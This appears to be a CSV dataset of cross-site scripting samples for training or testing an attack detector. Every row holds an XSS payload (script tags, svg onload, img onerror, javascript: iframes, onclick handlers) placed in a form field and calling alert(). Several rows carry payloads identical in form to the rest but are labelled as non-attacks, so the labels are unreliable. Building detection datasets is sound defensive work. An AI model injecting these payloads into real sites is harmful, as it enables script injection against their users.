id,description,payload,context,example_query,is_attack,attack_type
3542,Cross-Site Scripting (blended),profile=<svg/onload=alert(62127)>,Client-side Execution,Injected Script,Yes,XSS
3543,Cross-Site Scripting (blended),profile=<svg/onload=alert(63586)>,Client-side Execution,Injected Script,Yes,XSS
3544,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(74758)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3545,Cross-Site Scripting (blended),about=<b onclick=alert('XFTGFgBR')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3546,Cross-Site Scripting (blended),comment=<script>alert(11446)</script>,Client-side Execution,Injected Script,Yes,XSS
3547,Cross-Site Scripting (blended),profile=<svg/onload=alert(31604)>,Client-side Execution,Injected Script,Yes,XSS
3548,Cross-Site Scripting (blended),about=<b onclick=alert('IV0pYBQk')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3549,Cross-Site Scripting (blended),about=<b onclick=alert('dn8abBke')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3550,Cross-Site Scripting (blended),profile=<svg/onload=alert(12600)>,Client-side Execution,Injected Script,Yes,XSS
3551,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(97418)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3552,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(4624)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3553,Cross-Site Scripting (blended),comment=<script>alert(72797)</script>,Client-side Execution,Injected Script,Yes,XSS
3554,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(5620)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3555,Cross-Site Scripting (blended),profile=<svg/onload=alert(38782)>,Client-side Execution,Injected Script,Yes,XSS
3556,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(4686)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3557,Cross-Site Scripting (blended),about=<b onclick=alert('Tnhi1PlF')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3558,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('3pZgZ4os')>,Client-side Execution,Injected Script,Yes,XSS
3559,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(43802)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3560,Cross-Site Scripting (blended),profile=<svg/onload=alert(29646)>,Client-side Execution,Injected Script,Yes,XSS
3561,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(25312)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3562,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('VNWfLdVT')>,Client-side Execution,Injected Script,No,
3563,Cross-Site Scripting (blended),comment=<script>alert(71698)</script>,Client-side Execution,Injected Script,Yes,XSS
3564,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('4KKM2TQU')>,Client-side Execution,Injected Script,Yes,XSS
3565,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(20914)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3566,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('zyB3mouy')>,Client-side Execution,Injected Script,Yes,XSS
3567,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(45546)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3568,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(53483)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3569,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(2986)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3570,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(17764)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3571,Cross-Site Scripting (blended),profile=<svg/onload=alert(54698)>,Client-side Execution,Injected Script,Yes,XSS
3572,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('5Ty4GLNi')>,Client-side Execution,Injected Script,Yes,XSS
3573,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('YDv3zJaW')>,Client-side Execution,Injected Script,Yes,XSS
3574,Cross-Site Scripting (blended),about=<b onclick=alert('A2vFR4zC')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3575,Cross-Site Scripting (blended),about=<b onclick=alert('IV8Cqzkg')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3576,Cross-Site Scripting (blended),comment=<script>alert(35445)</script>,Client-side Execution,Injected Script,Yes,XSS
3577,Cross-Site Scripting (blended),about=<b onclick=alert('kbS4vRta')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3578,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(38133)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3579,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('3nnQZTxF')>,Client-side Execution,Injected Script,Yes,XSS
3580,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('hAcyH6E9')>,Client-side Execution,Injected Script,Yes,XSS
3581,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(69889)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3582,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(99236)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3583,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(42706)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3584,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(13503)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3585,Cross-Site Scripting (blended),profile=<svg/onload=alert(80134)>,Client-side Execution,Injected Script,Yes,XSS
3586,Cross-Site Scripting (blended),profile=<svg/onload=alert(52306)>,Client-side Execution,Injected Script,Yes,XSS
3587,Cross-Site Scripting (blended),comment=<script>alert(26463)</script>,Client-side Execution,Injected Script,Yes,XSS
3588,Cross-Site Scripting (blended),comment=<script>alert(368)</script>,Client-side Execution,Injected Script,Yes,XSS
3589,Cross-Site Scripting (blended),comment=<script>alert(92401)</script>,Client-side Execution,Injected Script,Yes,XSS
3590,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('MzLbHQvf')>,Client-side Execution,Injected Script,Yes,XSS
3591,Cross-Site Scripting (blended),about=<b onclick=alert('vLlXNJ2t')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3592,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(17372)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3593,Cross-Site Scripting (blended),about=<b onclick=alert('vlfPkc7a')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3594,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(72373)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3595,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('lrzRMZ5B')>,Client-side Execution,Injected Script,Yes,XSS
3596,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(90134)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3597,Cross-Site Scripting (blended),comment=<script>alert(66415)</script>,Client-side Execution,Injected Script,Yes,XSS
3598,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(76980)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3599,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(16595)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3600,Cross-Site Scripting (blended),profile=<svg/onload=alert(50380)>,Client-side Execution,Injected Script,Yes,XSS
3601,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(62957)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3602,Cross-Site Scripting (blended),about=<b onclick=alert('6KhBTzMo')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3603,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(97524)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3604,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('5CQEKIKd')>,Client-side Execution,Injected Script,Yes,XSS
3605,Cross-Site Scripting (blended),about=<b onclick=alert('z6rtCgQO')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3606,Cross-Site Scripting (blended),about=<b onclick=alert('vIUCskjU')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3607,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('Otvc1irB')>,Client-side Execution,Injected Script,Yes,XSS
3608,Cross-Site Scripting (blended),about=<b onclick=alert('jRLPtknA')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3609,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(56598)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3610,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(4989)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3611,Cross-Site Scripting (blended),comment=<script>alert(45808)</script>,Client-side Execution,Injected Script,Yes,XSS
3612,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('f5ZbWgCd')>,Client-side Execution,Injected Script,Yes,XSS
3613,Cross-Site Scripting (blended),about=<b onclick=alert('jNB47DMk')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3614,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(69298)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3615,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(8194)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3616,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(1775)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3617,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(83006)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3618,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(84157)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3619,Cross-Site Scripting (blended),profile=<svg/onload=alert(92485)>,Client-side Execution,Injected Script,Yes,XSS
3620,Cross-Site Scripting (blended),about=<b onclick=alert('qInIFVn1')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3621,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(97771)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3622,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('MmG6WQef')>,Client-side Execution,Injected Script,Yes,XSS
3623,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('sAUp7mSr')>,Client-side Execution,Injected Script,Yes,XSS
3624,Cross-Site Scripting (blended),about=<b onclick=alert('OlxBZVAF')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3625,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('1YlcObQg')>,Client-side Execution,Injected Script,Yes,XSS
3626,Cross-Site Scripting (blended),profile=<svg/onload=alert(68695)>,Client-side Execution,Injected Script,Yes,XSS
3627,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(16105)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3628,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('UL1o1IeO')>,Client-side Execution,Injected Script,No,
3629,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(13382)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3630,Cross-Site Scripting (blended),profile=<svg/onload=alert(56786)>,Client-side Execution,Injected Script,Yes,XSS
3631,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('klkXBDsu')>,Client-side Execution,Injected Script,Yes,XSS
3632,Cross-Site Scripting (blended),about=<b onclick=alert('y8ec0k6L')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3633,Cross-Site Scripting (blended),profile=<svg/onload=alert(87686)>,Client-side Execution,Injected Script,Yes,XSS
3634,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(29278)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3635,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(36765)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3636,Cross-Site Scripting (blended),about=<b onclick=alert('buJGHqxo')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3637,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('HynvLeDS')>,Client-side Execution,Injected Script,Yes,XSS
3638,Cross-Site Scripting (blended),about=<b onclick=alert('FDunLJLu')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3639,Cross-Site Scripting (blended),profile=<svg/onload=alert(39598)>,Client-side Execution,Injected Script,Yes,XSS
3640,Cross-Site Scripting (blended),about=<b onclick=alert('9IK1wRKr')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3641,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(85912)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3642,Cross-Site Scripting (blended),about=<b onclick=alert('crihPNCZ')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3643,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(98056)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3644,Cross-Site Scripting (blended),comment=<script>alert(54226)</script>,Client-side Execution,Injected Script,Yes,XSS
3645,Cross-Site Scripting (blended),about=<b onclick=alert('amgkq2SM')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3646,Cross-Site Scripting (blended),comment=<script>alert(11314)</script>,Client-side Execution,Injected Script,Yes,XSS
3647,Cross-Site Scripting (blended),profile=<svg/onload=alert(25490)>,Client-side Execution,Injected Script,Yes,XSS
3648,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(88681)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3649,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(90477)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3650,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(67720)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3651,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('5Eagc40Z')>,Client-side Execution,Injected Script,Yes,XSS
3652,Cross-Site Scripting (blended),profile=<svg/onload=alert(17009)>,Client-side Execution,Injected Script,No,
3653,Cross-Site Scripting (blended),about=<b onclick=alert('556McpdW')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3654,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('bTnieVt0')>,Client-side Execution,Injected Script,Yes,XSS
3655,Cross-Site Scripting (blended),about=<b onclick=alert('rJ3agaBm')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3656,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(69282)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3657,Cross-Site Scripting (blended),profile=<svg/onload=alert(19136)>,Client-side Execution,Injected Script,Yes,XSS
3658,Cross-Site Scripting (blended),profile=<svg/onload=alert(15352)>,Client-side Execution,Injected Script,Yes,XSS
3659,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(10222)></iframe>,Client-side Execution,Injected Script,No,
3660,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(31537)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3661,Cross-Site Scripting (blended),comment=<script>alert(28016)</script>,Client-side Execution,Injected Script,Yes,XSS
3662,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(7130)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3663,Cross-Site Scripting (blended),profile=<svg/onload=alert(60875)>,Client-side Execution,Injected Script,Yes,XSS
3664,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('DgJFfJpq')>,Client-side Execution,Injected Script,Yes,XSS
3665,Cross-Site Scripting (blended),comment=<script>alert(66571)</script>,Client-side Execution,Injected Script,Yes,XSS
3666,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(3357)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3667,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('EtJaiHWB')>,Client-side Execution,Injected Script,Yes,XSS
3668,Cross-Site Scripting (blended),comment=<script>alert(56190)</script>,Client-side Execution,Injected Script,Yes,XSS
3669,Cross-Site Scripting (blended),about=<b onclick=alert('73Zh1Fft')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3670,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(90470)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3671,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('lYZZN7hm')>,Client-side Execution,Injected Script,Yes,XSS
3672,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(33847)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3673,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(11219)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3674,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(27673)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3675,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(89115)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3676,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(5917)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3677,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('OPAJKd0x')>,Client-side Execution,Injected Script,Yes,XSS
3678,Cross-Site Scripting (blended),profile=<svg/onload=alert(42522)>,Client-side Execution,Injected Script,Yes,XSS
3679,Cross-Site Scripting (blended),profile=<svg/onload=alert(51043)>,Client-side Execution,Injected Script,Yes,XSS
3680,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(24898)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3681,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('y2EkiS6N')>,Client-side Execution,Injected Script,Yes,XSS
3682,Cross-Site Scripting (blended),profile=<svg/onload=alert(27059)>,Client-side Execution,Injected Script,Yes,XSS
3683,Cross-Site Scripting (blended),profile=<svg/onload=alert(76001)>,Client-side Execution,Injected Script,Yes,XSS
3684,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(60003)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3685,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(80794)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3686,Cross-Site Scripting (blended),profile=<svg/onload=alert(87390)>,Client-side Execution,Injected Script,Yes,XSS
3687,Cross-Site Scripting (blended),comment=<script>alert(30207)</script>,Client-side Execution,Injected Script,Yes,XSS
3688,Cross-Site Scripting (blended),comment=<script>alert(29623)</script>,Client-side Execution,Injected Script,Yes,XSS
3689,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(69725)%3C/script%3E,Client-side Execution,Injected Script,No,
3690,Cross-Site Scripting (blended),about=<b onclick=alert('G9St17Dm')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3691,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('pLx49q0A')>,Client-side Execution,Injected Script,Yes,XSS
3692,Cross-Site Scripting (blended),comment=<script>alert(85426)</script>,Client-side Execution,Injected Script,Yes,XSS
3693,Cross-Site Scripting (blended),comment=<script>alert(9194)</script>,Client-side Execution,Injected Script,Yes,XSS
3694,Cross-Site Scripting (blended),comment=<script>alert(4974)</script>,Client-side Execution,Injected Script,Yes,XSS
3695,Cross-Site Scripting (blended),comment=<script>alert(17564)</script>,Client-side Execution,Injected Script,Yes,XSS
3696,Cross-Site Scripting (blended),about=<b onclick=alert('KNCTU6sU')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3697,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('nHlTHzRP')>,Client-side Execution,Injected Script,Yes,XSS
3698,Cross-Site Scripting (blended),comment=<script>alert(66807)</script>,Client-side Execution,Injected Script,Yes,XSS
3699,Cross-Site Scripting (blended),profile=<svg/onload=alert(99057)>,Client-side Execution,Injected Script,Yes,XSS
3700,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(9294)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3701,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(95271)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3702,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('HKLyuW00')>,Client-side Execution,Injected Script,Yes,XSS
3703,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(55383)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3704,Cross-Site Scripting (blended),comment=<script>alert(54692)</script>,Client-side Execution,Injected Script,Yes,XSS
3705,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(69540)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3706,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(46689)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3707,Cross-Site Scripting (blended),comment=<script>alert(25037)</script>,Client-side Execution,Injected Script,Yes,XSS
3708,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(66966)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3709,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('AI6oNUIV')>,Client-side Execution,Injected Script,Yes,XSS
3710,Cross-Site Scripting (blended),about=<b onclick=alert('IARPljKa')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3711,Cross-Site Scripting (blended),profile=<svg/onload=alert(18642)>,Client-side Execution,Injected Script,Yes,XSS
3712,Cross-Site Scripting (blended),profile=<svg/onload=alert(42370)>,Client-side Execution,Injected Script,Yes,XSS
3713,Cross-Site Scripting (blended),profile=<svg/onload=alert(41322)>,Client-side Execution,Injected Script,Yes,XSS
3714,Cross-Site Scripting (blended),comment=<script>alert(95890)</script>,Client-side Execution,Injected Script,Yes,XSS
3715,Cross-Site Scripting (blended),profile=<svg/onload=alert(79802)>,Client-side Execution,Injected Script,Yes,XSS
3716,Cross-Site Scripting (blended),profile=<svg/onload=alert(99655)>,Client-side Execution,Injected Script,Yes,XSS
3717,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(46187)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3718,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('QNDVPY38')>,Client-side Execution,Injected Script,Yes,XSS
3719,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(77023)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3720,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(95288)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3721,Cross-Site Scripting (blended),comment=<script>alert(67040)</script>,Client-side Execution,Injected Script,Yes,XSS
3722,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(16856)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3723,Cross-Site Scripting (blended),comment=<script>alert(6344)</script>,Client-side Execution,Injected Script,Yes,XSS
3724,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('2NSO4E7r')>,Client-side Execution,Injected Script,Yes,XSS
3725,Cross-Site Scripting (blended),profile=<svg/onload=alert(22712)>,Client-side Execution,Injected Script,Yes,XSS
3726,Cross-Site Scripting (blended),comment=<script>alert(27254)</script>,Client-side Execution,Injected Script,Yes,XSS
3727,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('yiT1Ato0')>,Client-side Execution,Injected Script,Yes,XSS
3728,Cross-Site Scripting (blended),profile=<svg/onload=alert(41547)>,Client-side Execution,Injected Script,Yes,XSS
3729,Cross-Site Scripting (blended),comment=<script>alert(31562)</script>,Client-side Execution,Injected Script,Yes,XSS
3730,Cross-Site Scripting (blended),profile=<svg/onload=alert(58217)>,Client-side Execution,Injected Script,Yes,XSS
3731,Cross-Site Scripting (blended),comment=<script>alert(68400)</script>,Client-side Execution,Injected Script,Yes,XSS
3732,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(87036)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3733,Cross-Site Scripting (blended),comment=<script>alert(57868)</script>,Client-side Execution,Injected Script,Yes,XSS
3734,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('AVz1dWf0')>,Client-side Execution,Injected Script,Yes,XSS
3735,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(78366)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3736,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(95127)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3737,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(21118)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3738,Cross-Site Scripting (blended),about=<b onclick=alert('aAncIbtr')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3739,Cross-Site Scripting (blended),profile=<svg/onload=alert(64696)>,Client-side Execution,Injected Script,Yes,XSS
3740,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(35862)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3741,Cross-Site Scripting (blended),about=<b onclick=alert('U6Q8e9Rv')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3742,Cross-Site Scripting (blended),about=<b onclick=alert('peMVplxH')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3743,Cross-Site Scripting (blended),about=<b onclick=alert('J7uyHCjy')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3744,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(67239)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3745,Cross-Site Scripting (blended),profile=<svg/onload=alert(87391)>,Client-side Execution,Injected Script,Yes,XSS
3746,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(90785)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3747,Cross-Site Scripting (blended),profile=<svg/onload=alert(564)>,Client-side Execution,Injected Script,Yes,XSS
3748,Cross-Site Scripting (blended),comment=<script>alert(29393)</script>,Client-side Execution,Injected Script,Yes,XSS
3749,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('AozLy9St')>,Client-side Execution,Injected Script,No,
3750,Cross-Site Scripting (blended),profile=<svg/onload=alert(44417)>,Client-side Execution,Injected Script,Yes,XSS
3751,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(5902)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3752,Cross-Site Scripting (blended),profile=<svg/onload=alert(45576)>,Client-side Execution,Injected Script,Yes,XSS
3753,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(95079)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3754,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(76712)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3755,Cross-Site Scripting (blended),about=<b onclick=alert('T0tqXBeD')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3756,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(93246)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3757,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(76583)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3758,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(81116)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3759,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(18927)%3C/script%3E,Client-side Execution,Injected Script,Yes,XSS
3760,Cross-Site Scripting (blended),about=<b onclick=alert('DzRaLtku')>Hello</b>,Client-side Execution,Injected Script,Yes,XSS
3761,Cross-Site Scripting (blended),profile=<svg/onload=alert(94745)>,Client-side Execution,Injected Script,Yes,XSS
3762,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('5HCBqALO')>,Client-side Execution,Injected Script,Yes,XSS
3763,Cross-Site Scripting (blended),desc=<iframe src=javascript:alert(55522)></iframe>,Client-side Execution,Injected Script,Yes,XSS
3764,Cross-Site Scripting (blended),input=%3Cscript%3Ealert(44792)%3C/script%3E,Client-side Execution,Injected Script,No,
3765,Cross-Site Scripting (blended),bio=<img src=x onerror=alert('9upkccar')>,Client-side Execution,Injected Script,Yes,XSS
